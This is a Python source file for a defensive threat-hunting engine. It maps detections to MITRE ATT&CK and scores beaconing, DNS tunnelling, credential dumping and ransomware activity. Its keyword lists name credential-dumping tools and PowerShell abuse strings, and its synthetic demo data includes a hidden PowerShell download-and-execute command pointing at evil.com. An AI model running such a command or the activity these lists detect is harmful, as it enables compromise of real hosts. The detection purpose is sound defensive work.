"""
ThreatHunt — AI-Powered Automated Threat Hunting Engine

Proactively searches for hidden threats using behavioral analysis,
anomaly detection, and MITRE ATT&CK framework mapping.
"""

import json
import hashlib
import math
from datetime import datetime, timezone
from dataclasses import dataclass, field, asdict
from enum import Enum
from typing import Any, Optional
from collections import Counter


class ThreatLevel(Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


class HuntStatus(Enum):
    PENDING = "pending"
    RUNNING = "running"
    COMPLETE = "complete"
    FAILED = "failed"


@dataclass
class MITRETactic:
    id: str
    name: str
    description: str


@dataclass
class MITRTechnique:
    id: str
    name: str
    tactic: MITRETactic
    description: str
    detection: str = ""
    mitigation: str = ""


@dataclass
class IoC:
    type: str
    value: str
    confidence: float
    source: str = ""
    first_seen: str = ""
    last_seen: str = ""
    tags: list = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "type": self.type,
            "value": self.value,
            "confidence": self.confidence,
            "source": self.source,
            "first_seen": self.first_seen,
            "last_seen": self.last_seen,
            "tags": self.tags,
        }


@dataclass
class Finding:
    hunt_name: str
    technique: str
    tactic: str
    confidence: float
    severity: ThreatLevel
    description: str
    evidence: list = field(default_factory=list)
    timestamp: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
    iocs: list = field(default_factory=list)
    recommended_action: str = ""

    def to_dict(self) -> dict:
        return {
            "hunt": self.hunt_name,
            "technique": self.technique,
            "tactic": self.tactic,
            "confidence": self.confidence,
            "severity": self.severity.value,
            "description": self.description,
            "evidence": self.evidence,
            "timestamp": self.timestamp,
            "iocs": [ioc.to_dict() if hasattr(ioc, "to_dict") else ioc for ioc in self.iocs],
            "recommended_action": self.recommended_action,
        }


@dataclass
class HuntQuery:
    name: str
    mitre_technique: str
    mitre_tactic: str
    description: str
    severity: ThreatLevel = ThreatLevel.MEDIUM
    enabled: bool = True
    data_sources: list = field(default_factory=lambda: ["all"])
    logic: Optional[dict] = None

    def to_dict(self) -> dict:
        return {
            "name": self.name,
            "mitre_technique": self.mitre_technique,
            "mitre_tactic": self.mitre_tactic,
            "description": self.description,
            "severity": self.severity.value,
            "enabled": self.enabled,
            "data_sources": self.data_sources,
        }


@dataclass
class HuntResult:
    timestamp: str
    timeframe: str
    total_queries: int
    findings: list
    iocs_found: int
    data_sources: list
    status: str = "complete"

    def to_dict(self) -> dict:
        return {
            "timestamp": self.timestamp,
            "timeframe": self.timeframe,
            "total_queries": self.total_queries,
            "findings": [f.to_dict() if hasattr(f, "to_dict") else f for f in self.findings],
            "iocs_found": self.iocs_found,
            "data_sources": self.data_sources,
            "status": self.status,
        }


# ─── MITRE ATT&CK Knowledge Base ─────────────────────────────────────

MITRE_TACTICS = {
    "TA0001": MITRETactic("TA0001", "Initial Access", "Adversary gains initial foothold"),
    "TA0002": MITRETactic("TA0002", "Execution", "Adversary executes malicious code"),
    "TA0003": MITRETactic("TA0003", "Persistence", "Adversary maintains foothold"),
    "TA0004": MITRETactic("TA0004", "Privilege Escalation", "Adversary gains higher privileges"),
    "TA0005": MITRETactic("TA0005", "Defense Evasion", "Adversary avoids detection"),
    "TA0006": MITRETactic("TA0006", "Credential Access", "Adversary steals credentials"),
    "TA0007": MITRETactic("TA0007", "Discovery", "Adversary explores environment"),
    "TA0008": MITRETactic("TA0008", "Lateral Movement", "Adversary moves through network"),
    "TA0009": MITRETactic("TA0009", "Collection", "Adversary gathers data"),
    "TA0010": MITRETactic("TA0010", "Exfiltration", "Adversary steals data"),
    "TA0011": MITRETactic("TA0011", "Command and Control", "Adversary communicates with C2"),
    "TA0040": MITRETactic("TA0040", "Impact", "Adversary disrupts operations"),
}

MITRE_TECHNIQUES = {
    "T1021": MITRTechnique("T1021", "Remote Services", MITRE_TACTICS["TA0008"],
                           "Adversary uses remote services for lateral movement",
                           "Monitor authentication logs for unusual remote access",
                           "Segment networks, enforce MFA"),
    "T1053": MITRTechnique("T1053", "Scheduled Task/Job", MITRE_TACTICS["TA0003"],
                           "Adversary uses scheduled tasks for persistence",
                           "Monitor creation of scheduled tasks",
                           "Restrict task creation permissions"),
    "T1048": MITRTechnique("T1048", "Exfiltration Over Alternative Protocol", MITRE_TACTICS["TA0010"],
                           "Adversary exfiltrates data over non-standard protocols",
                           "Monitor for unusual outbound data transfers",
                           "Deploy DLP, monitor DNS tunnels"),
    "T1003": MITRTechnique("T1003", "OS Credential Dumping", MITRE_TACTICS["TA0006"],
                           "Adversary dumps credentials from memory/registry",
                           "Monitor for LSASS access, SAM database reads",
                           "Enable Credential Guard, restrict admin access"),
    "T1027": MITRTechnique("T1027", "Obfuscated Files or Information", MITRE_TACTICS["TA0005"],
                           "Adversary obfuscates malicious payloads",
                           "Analyze entropy, detect packed executables",
                           "Deploy application whitelisting"),
    "T1059": MITRTechnique("T1059", "Command and Scripting Interpreter", MITRE_TACTICS["TA0002"],
                           "Adversary uses PowerShell, Bash, or other interpreters",
                           "Monitor script execution, script block logging",
                           "Constrained Language Mode, AppLocker"),
    "T1071": MITRTechnique("T1071", "Application Layer Protocol", MITRE_TACTICS["TA0011"],
                           "Adversary uses HTTP/DNS for C2 communication",
                           "Monitor for beaconing patterns",
                           "Deploy network proxies with inspection"),
    "T1078": MITRTechnique("T1078", "Valid Accounts", MITRE_TACTICS["TA0001"],
                           "Adversary uses legitimate credentials",
                           "Monitor for impossible travel, unusual access patterns",
                           "Implement JIT access, PAM solutions"),
    "T1082": MITRTechnique("T1082", "System Information Discovery", MITRE_TACTICS["TA0007"],
                           "Adversary gathers system information",
                           "Monitor WMI/PowerShell enumeration commands",
                           "Restrict WMI access, monitor event logs"),
    "T1105": MITRTechnique("T1105", "Ingress Tool Transfer", MITRE_TACTICS["TA0011"],
                           "Adversary downloads tools to compromised host",
                           "Monitor for unexpected downloads, process creation",
                           "Deploy application whitelisting, URL filtering"),
    "T1190": MITRTechnique("T1190", "Exploit Public-Facing Application", MITRE_TACTICS["TA0001"],
                           "Adversary exploits internet-facing services",
                           "Monitor application logs for exploit attempts",
                           "Patch management, WAF deployment"),
    "T1486": MITRTechnique("T1486", "Data Encrypted for Impact", MITRE_TACTICS["TA0040"],
                           "Adversary encrypts data (ransomware)",
                           "Monitor for mass file encryption, entropy changes",
                           "Immutable backups, network segmentation"),
}


class ThreatHunter:
    """AI-Powered Automated Threat Hunting Engine."""

    # Built-in hunt queries mapped to MITRE ATT&CK
    BUILTIN_HUNTS = {
        "lateral-movement": HuntQuery(
            name="lateral-movement",
            mitre_technique="T1021",
            mitre_tactic="TA0008",
            description="Detect SMB/SSH/WMI lateral movement between hosts",
            severity=ThreatLevel.HIGH,
            data_sources=["syslog", "auth", "netflow"],
        ),
        "persistence-scheduled-tasks": HuntQuery(
            name="persistence-scheduled-tasks",
            mitre_technique="T1053",
            mitre_tactic="TA0003",
            description="Detect unauthorized scheduled task creation",
            severity=ThreatLevel.HIGH,
            data_sources=["syslog", "windows-event"],
        ),
        "exfiltration-dns": HuntQuery(
            name="exfiltration-dns",
            mitre_technique="T1048",
            mitre_tactic="TA0010",
            description="Detect DNS tunneling and unusual DNS data transfers",
            severity=ThreatLevel.CRITICAL,
            data_sources=["dns", "netflow"],
        ),
        "credential-dumping": HuntQuery(
            name="credential-dumping",
            mitre_technique="T1003",
            mitre_tactic="TA0006",
            description="Detect LSASS access, SAM database reads, DCSync",
            severity=ThreatLevel.CRITICAL,
            data_sources=["syslog", "windows-event", "auth"],
        ),
        "obfuscated-payloads": HuntQuery(
            name="obfuscated-payloads",
            mitre_technique="T1027",
            mitre_tactic="TA0005",
            description="Detect high-entropy files and packed executables",
            severity=ThreatLevel.MEDIUM,
            data_sources=["filesystem", "process"],
        ),
        "powershell-abuse": HuntQuery(
            name="powershell-abuse",
            mitre_technique="T1059",
            mitre_tactic="TA0002",
            description="Detect suspicious PowerShell commands and scripts",
            severity=ThreatLevel.HIGH,
            data_sources=["process", "windows-event"],
        ),
        "c2-beaconing": HuntQuery(
            name="c2-beaconing",
            mitre_technique="T1071",
            mitre_tactic="TA0011",
            description="Detect periodic C2 beaconing patterns in network traffic",
            severity=ThreatLevel.CRITICAL,
            data_sources=["netflow", "dns", "proxy"],
        ),
        "stolen-credentials": HuntQuery(
            name="stolen-credentials",
            mitre_technique="T1078",
            mitre_tactic="TA0001",
            description="Detect use of compromised accounts (impossible travel, unusual hours)",
            severity=ThreatLevel.HIGH,
            data_sources=["auth", "vpn"],
        ),
        "system-enumeration": HuntQuery(
            name="system-enumeration",
            mitre_technique="T1082",
            mitre_tactic="TA0007",
            description="Detect system information gathering commands",
            severity=ThreatLevel.MEDIUM,
            data_sources=["process", "syslog"],
        ),
        "tool-transfer": HuntQuery(
            name="tool-transfer",
            mitre_technique="T1105",
            mitre_tactic="TA0011",
            description="Detect download of offensive tools to compromised hosts",
            severity=ThreatLevel.HIGH,
            data_sources=["netflow", "process", "proxy"],
        ),
        "ransomware-encryption": HuntQuery(
            name="ransomware-encryption",
            mitre_technique="T1486",
            mitre_tactic="TA0040",
            description="Detect mass file encryption activity (ransomware)",
            severity=ThreatLevel.CRITICAL,
            data_sources=["filesystem", "process"],
        ),
        "app-exploit": HuntQuery(
            name="app-exploit",
            mitre_technique="T1190",
            mitre_tactic="TA0001",
            description="Detect exploitation of public-facing applications",
            severity=ThreatLevel.CRITICAL,
            data_sources=["web", "waf", "syslog"],
        ),
    }

    def __init__(self, data_sources: list[str] = None):
        self.data_sources = data_sources or ["all"]
        self.hunt_queries: dict[str, HuntQuery] = dict(self.BUILTIN_HUNTS)
        self.ioc_feeds: list[IoC] = []
        self.findings: list[Finding] = []
        self.hunt_history: list[HuntResult] = []

    def add_hunt(self, query: HuntQuery) -> None:
        """Add a custom hunt query."""
        self.hunt_queries[query.name] = query

    def load_iocs(self, filepath: str) -> int:
        """Load IoCs from a JSON file."""
        try:
            with open(filepath) as f:
                data = json.load(f)
            count = 0
            for ioc_data in data.get("iocs", []):
                ioc = IoC(
                    type=ioc_data["type"],
                    value=ioc_data["value"],
                    confidence=ioc_data.get("confidence", 0.5),
                    source=ioc_data.get("source", ""),
                    tags=ioc_data.get("tags", []),
                )
                self.ioc_feeds.append(ioc)
                count += 1
            return count
        except FileNotFoundError:
            return 0

    def add_ioc(self, ioc: IoC) -> None:
        """Add an IoC to the feed."""
        self.ioc_feeds.append(ioc)

    def _anomaly_score(self, values: list[float]) -> float:
        """Simple z-score based anomaly detection."""
        if len(values) < 2:
            return 0.0
        mean = sum(values) / len(values)
        variance = sum((x - mean) ** 2 for x in values) / len(values)
        std = math.sqrt(variance) if variance > 0 else 1.0
        latest = values[-1]
        z_score = abs(latest - mean) / std if std > 0 else 0.0
        return min(z_score / 3.0, 1.0)

    def _detect_beaconing(self, timestamps: list[float]) -> float:
        """Detect periodic beaconing by analyzing inter-arrival times."""
        if len(timestamps) < 5:
            return 0.0
        sorted_ts = sorted(timestamps)
        diffs = [sorted_ts[i + 1] - sorted_ts[i] for i in range(len(sorted_ts) - 1)]
        if not diffs:
            return 0.0
        mean_diff = sum(diffs) / len(diffs)
        variance = sum((d - mean_diff) ** 2 for d in diffs) / len(diffs)
        cv = math.sqrt(variance) / mean_diff if mean_diff > 0 else 0.0
        score = max(0.0, 1.0 - cv)
        return score if score > 0.5 else 0.0

    def _check_iocs(self, data: list[str]) -> list[IoC]:
        """Check data against IoC feeds."""
        matches = []
        data_set = set(data)
        for ioc in self.ioc_feeds:
            if ioc.value in data_set:
                matches.append(ioc)
        return matches

    def hunt(self, timeframe: str = "24h", events: list[dict] = None) -> HuntResult:
        """
        Run threat hunt across all enabled queries.
        If no events provided, uses synthetic demo data.
        """
        if events is None:
            events = self._demo_events()

        self.findings = []
        total_queries = 0

        for name, query in self.hunt_queries.items():
            if not query.enabled:
                continue
            if "all" not in self.data_sources:
                if not any(ds in self.data_sources for ds in query.data_sources):
                    continue

            total_queries += 1
            detections = self._execute_hunt(query, events)
            self.findings.extend(detections)

        ioc_data = []
        for event in events:
            for key in ["src_ip", "dst_ip", "hash", "domain", "url"]:
                if key in event:
                    ioc_data.append(str(event[key]))

        ioc_matches = self._check_iocs(set(ioc_data))

        all_iocs = []
        for f in self.findings:
            all_iocs.extend(f.iocs)

        result = HuntResult(
            timestamp=datetime.now(timezone.utc).isoformat(),
            timeframe=timeframe,
            total_queries=total_queries,
            findings=self.findings,
            iocs_found=len(ioc_matches) + len(all_iocs),
            data_sources=self.data_sources,
        )
        self.hunt_history.append(result)
        return result

    def _execute_hunt(self, query: HuntQuery, events: list[dict]) -> list[Finding]:
        """Execute a single hunt query against events."""
        findings = []
        relevant_events = [
            e for e in events
            if e.get("source") in query.data_sources or "all" in query.data_sources
        ]

        if not relevant_events:
            return findings

        name = query.name

        if name == "c2-beaconing":
            ip_events = {}
            for e in relevant_events:
                ip = e.get("src_ip", e.get("dst_ip", ""))
                if ip:
                    ip_events.setdefault(ip, []).append(e.get("timestamp", 0))

            for ip, timestamps in ip_events.items():
                if len(timestamps) >= 5:
                    score = self._detect_beaconing(timestamps)
                    if score > 0.5:
                        findings.append(Finding(
                            hunt_name=name,
                            technique=query.mitre_technique,
                            tactic=query.mitre_tactic,
                            confidence=score,
                            severity=query.severity,
                            description=f"Beaconing detected from {ip} (confidence: {score:.0%})",
                            evidence=[f"IP: {ip}", f"Events: {len(timestamps)}",
                                      f"Beacon score: {score:.2f}"],
                            iocs=[IoC("ip", ip, score, "hunt")],
                            recommended_action="Investigate host, block IP, analyze C2 traffic",
                        ))

        elif name == "credential-dumping":
            suspicious_procs = [
                "lsass.exe", "sam.exe", "mimikatz.exe", "procdump.exe",
                "comsvcs.dll", "rundll32.exe"
            ]
            for e in relevant_events:
                proc = e.get("process", "").lower()
                if any(sp in proc for sp in suspicious_procs):
                    findings.append(Finding(
                        hunt_name=name,
                        technique=query.mitre_technique,
                        tactic=query.mitre_tactic,
                        confidence=0.85,
                        severity=query.severity,
                        description=f"Suspicious credential access process: {e.get('process')}",
                        evidence=[f"Process: {e.get('process')}",
                                  f"User: {e.get('user', 'unknown')}",
                                  f"Host: {e.get('host', 'unknown')}"],
                        recommended_action="Isolate host, reset credentials, review access logs",
                    ))

        elif name == "ransomware-encryption":
            write_counts = Counter()
            for e in relevant_events:
                if e.get("event_type") == "file_write":
                    ext = e.get("file_ext", "")
                    write_counts[ext] += 1

            ransomware_exts = [".encrypted", ".locked", ".crypto", ".crypt", ".enc"]
            for ext, count in write_counts.items():
                if any(re in ext.lower() for re in ransomware_exts) and count > 10:
                    findings.append(Finding(
                        hunt_name=name,
                        technique=query.mitre_technique,
                        tactic=query.mitre_tactic,
                        confidence=0.95,
                        severity=ThreatLevel.CRITICAL,
                        description=f"Mass file encryption detected: {count} files with extension {ext}",
                        evidence=[f"Extension: {ext}", f"File writes: {count}"],
                        recommended_action="ISOLATE HOST IMMEDIATELY, shut down network share access",
                    ))

        elif name == "powershell-abuse":
            suspicious_ps = [
                "invoke-expression", "invoke-mimikatz", "downloadstring",
                "invoke-webrequest", "bypass", "encodedcommand", "hidden",
                "amsistartup", "set-mppolicy", "disable-realtime"
            ]
            for e in relevant_events:
                cmd = e.get("command_line", "").lower()
                if "powershell" in cmd or "pwsh" in cmd:
                    hits = sum(1 for s in suspicious_ps if s in cmd)
                    if hits >= 2:
                        confidence = min(0.5 + hits * 0.1, 0.95)
                        findings.append(Finding(
                            hunt_name=name,
                            technique=query.mitre_technique,
                            tactic=query.mitre_tactic,
                            confidence=confidence,
                            severity=query.severity,
                            description=f"Suspicious PowerShell activity ({hits} indicators)",
                            evidence=[f"Command: {e.get('command_line', '')[:100]}",
                                      f"User: {e.get('user', 'unknown')}",
                                      f"Host: {e.get('host', 'unknown')}"],
                            recommended_action="Review PowerShell logs, enable script block logging",
                        ))

        elif name == "lateral-movement":
            for e in relevant_events:
                if e.get("event_type") == "remote_auth":
                    score = 0.6
                    if e.get("time_hour", 12) < 6 or e.get("time_hour", 12) > 22:
                        score += 0.2
                    if e.get("failed_attempts", 0) > 3:
                        score += 0.15
                    if score > 0.6:
                        findings.append(Finding(
                            hunt_name=name,
                            technique=query.mitre_technique,
                            tactic=query.mitre_tactic,
                            confidence=min(score, 0.95),
                            severity=query.severity,
                            description=f"Suspicious lateral movement: {e.get('src_ip')} → {e.get('dst_ip')}",
                            evidence=[f"Source: {e.get('src_ip')}",
                                      f"Destination: {e.get('dst_ip')}",
                                      f"Protocol: {e.get('protocol', 'unknown')}"],
                            iocs=[IoC("ip", e.get("src_ip", ""), score, "hunt")],
                            recommended_action="Investigate source host, review access patterns",
                        ))

        elif name == "exfiltration-dns":
            for e in relevant_events:
                domain = e.get("domain", "")
                if len(domain) > 50 or domain.count(".") > 4:
                    score = 0.7 if len(domain) > 60 else 0.5
                    findings.append(Finding(
                        hunt_name=name,
                        technique=query.mitre_technique,
                        tactic=query.mitre_tactic,
                        confidence=score,
                        severity=query.severity,
                        description=f"Possible DNS tunneling: {domain[:40]}...",
                        evidence=[f"Domain: {domain}",
                                  f"Query length: {len(domain)}",
                                  f"Subdomains: {domain.count('.')}"],
                        iocs=[IoC("domain", domain, score, "hunt")],
                        recommended_action="Block domain, investigate DNS logs, check for data exfil",
                    ))

        else:
            anomaly_events = [e.get("anomaly_score", 0) for e in relevant_events if "anomaly_score" in e]
            if anomaly_events:
                score = self._anomaly_score(anomaly_events)
                if score > 0.3:
                    findings.append(Finding(
                        hunt_name=name,
                        technique=query.mitre_technique,
                        tactic=query.mitre_tactic,
                        confidence=score,
                        severity=query.severity,
                        description=f"Anomalous activity detected by {name} hunt",
                        evidence=[f"Anomaly score: {score:.2f}",
                                  f"Events analyzed: {len(relevant_events)}"],
                        recommended_action="Investigate anomalies, correlate with other findings",
                    ))

        return findings

    def match_iocs(self, data: list[str]) -> list[IoC]:
        """Match arbitrary data against loaded IoC feeds."""
        return self._check_iocs(data)

    def export(self, findings: list[Finding] = None, format: str = "json") -> str:
        """Export findings in various formats."""
        if findings is None:
            findings = self.findings

        if format == "json":
            return json.dumps([f.to_dict() for f in findings], indent=2)

        elif format == "stix":
            stix_objects = []
            for f in findings:
                stix_objects.append({
                    "type": "observed-data",
                    "spec_version": "2.1",
                    "id": hashlib.md5(f"{f.hunt_name}{f.technique}".encode()).hexdigest()[:8],
                    "created": f.timestamp,
                    "name": f"{f.hunt_name}: {f.technique}",
                    "pattern": f"[finding:severity = '{f.severity.value}']",
                    "description": f.description,
                    "confidence": int(f.confidence * 100),
                    "labels": [f.severity.value, f.tactic, f.technique],
                })
            return json.dumps(stix_objects, indent=2)

        elif format == "csv":
            lines = ["hunt,technique,tactic,confidence,severity,description"]
            for f in findings:
                lines.append(f"{f.hunt_name},{f.technique},{f.tactic},{f.confidence:.0%},{f.severity.value},\"{f.description}\"")
            return "\n".join(lines)

        elif format == "markdown":
            lines = ["# Threat Hunt Report\n"]
            lines.append(f"**Timeframe:** {self.hunt_history[-1].timeframe if self.hunt_history else 'N/A'}\n")
            lines.append(f"**Findings:** {len(findings)}\n")

            severity_order = [ThreatLevel.CRITICAL, ThreatLevel.HIGH, ThreatLevel.MEDIUM, ThreatLevel.LOW]
            for sev in severity_order:
                sev_findings = [f for f in findings if f.severity == sev]
                if sev_findings:
                    lines.append(f"\n## {sev.value.upper()} ({len(sev_findings)})\n")
                    for f in sev_findings:
                        lines.append(f"### {f.hunt_name} — {f.technique}")
                        lines.append(f"- **Confidence:** {f.confidence:.0%}")
                        lines.append(f"- **Description:** {f.description}")
                        lines.append(f"- **Action:** {f.recommended_action}")
                        lines.append("")

            return "\n".join(lines)

        return json.dumps([f.to_dict() for f in findings], indent=2)

    def summary(self) -> dict:
        """Get summary of latest hunt."""
        if not self.hunt_history:
            return {"error": "No hunts performed"}

        latest = self.hunt_history[-1]
        by_severity = Counter()
        by_tactic = Counter()
        by_technique = Counter()

        for f in latest.findings:
            by_severity[f.severity.value] += 1
            by_tactic[f.tactic] += 1
            by_technique[f.technique] += 1

        return {
            "timeframe": latest.timeframe,
            "total_findings": len(latest.findings),
            "by_severity": dict(by_severity),
            "by_tactic": dict(by_tactic),
            "by_technique": dict(by_technique),
            "iocs_found": latest.ioc_feeds if hasattr(latest, "ioc_feeds") else latest.iocs_found,
            "queries_run": latest.total_queries,
        }

    def _demo_events(self) -> list[dict]:
        """Generate synthetic demo events for demonstration."""
        import random
        random.seed(42)

        events = []

        for i in range(100):
            events.append({
                "timestamp": 1690000000 + i * 300,
                "source": random.choice(["syslog", "dns", "netflow", "auth", "process"]),
                "event_type": random.choice(["login", "connection", "file_access", "process_start"]),
                "src_ip": f"10.0.{random.randint(1, 10)}.{random.randint(1, 254)}",
                "dst_ip": f"192.168.1.{random.randint(1, 254)}",
                "user": f"user_{random.randint(1, 20)}",
                "host": f"host-{random.choice(['web', 'db', 'app', 'dc'])}-{random.randint(1, 5)}",
                "anomaly_score": random.random(),
            })

        suspicious = [
            {"process": "mimikatz.exe", "source": "process", "user": "SYSTEM", "host": "dc-01",
             "timestamp": 1690001000},
            {"process": "procdump.exe", "source": "process", "user": "admin", "host": "web-01",
             "timestamp": 1690001300},
            {"event_type": "remote_auth", "src_ip": "10.0.5.100", "dst_ip": "10.0.1.50",
             "source": "auth", "protocol": "smb", "time_hour": 3, "failed_attempts": 0,
             "timestamp": 1690002000},
            {"domain": "a]3f8k2m9x1b5c7d0e4f6g8h2j1k3l5m7n9o1p2q4r6s8t0u2v4w6x8y0abc.xyz",
             "source": "dns", "timestamp": 1690003000},
            {"command_line": "powershell -enc bypass -w hidden -nop Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/payload')",
             "source": "process", "user": "admin", "host": "web-02", "timestamp": 1690004000},
            {"event_type": "file_write", "file_ext": ".encrypted", "source": "filesystem",
             "host": "fileserver-01", "timestamp": 1690005000},
        ]
        events.extend(suspicious)

        return events
